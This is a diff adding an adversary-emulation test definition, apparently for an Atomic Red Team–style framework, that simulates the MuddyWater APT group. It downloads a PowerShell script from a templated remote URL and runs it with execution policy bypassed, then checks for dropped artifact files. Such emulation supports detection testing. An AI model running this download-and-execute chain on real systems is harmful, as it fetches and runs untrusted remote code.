@@ -1,0 +1,29 @@
+attack_technique: T1059.001_muddy_icon
+display_name: '模拟APT组织-MuddyWater下载powershell代码并释放攻击载荷'
+atomic_tests:
+- name: PowerShell Script Execution
+  description: |
+    模拟APT组织-MuddyWater下载powershell代码并释放攻击载荷
+  supported_platforms:
+  - windows
+  dependencies:
+  - prereq_command: |
+      if (-Not (Test-Path -Path "C:\Windows\Temp\icon_((businessId)).ps1")) { exit 1 } else { exit 0 }
+    get_prereq_command: |
+      Invoke-WebRequest -Uri *{evelicon} -OutFile C:\Windows\Temp\icon_((businessId)).ps1
+  executor:
+    command: |
+      powershell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -command "C:\Windows\Temp\icon_((businessId)).ps1"
+    cleanup_command: |
+      Remove-Item -Path "C:\Windows\Temp\temp.jpg" -ErrorAction Ignore
+      Remove-Item -Path "C:\Windows\Temp\Windows.vbe" -ErrorAction Ignore
+      Remove-Item -Path "C:\ProgramData\Microsoft.db" -ErrorAction Ignore
+  validate:
+    command: |
+      Test-Path "C:\Windows\Temp\temp.jpg" -or Test-Path "C:\Windows\Temp\Windows.vbe" -or Test-Path "C:\ProgramData\Microsoft.db"
+    expression: validate.command.result -eq $true
+  wrong:
+    command: |
+      $commandErrorLevel = $LASTEXITCODE
+      $fileContent = Get-Content "C:\Windows\Temp\icon_((businessId)).ps1"
+      if ($commandErrorLevel -eq 5 -or $fileContent -match "virus" -or $fileContent -match "病毒") { $true } else { $false }
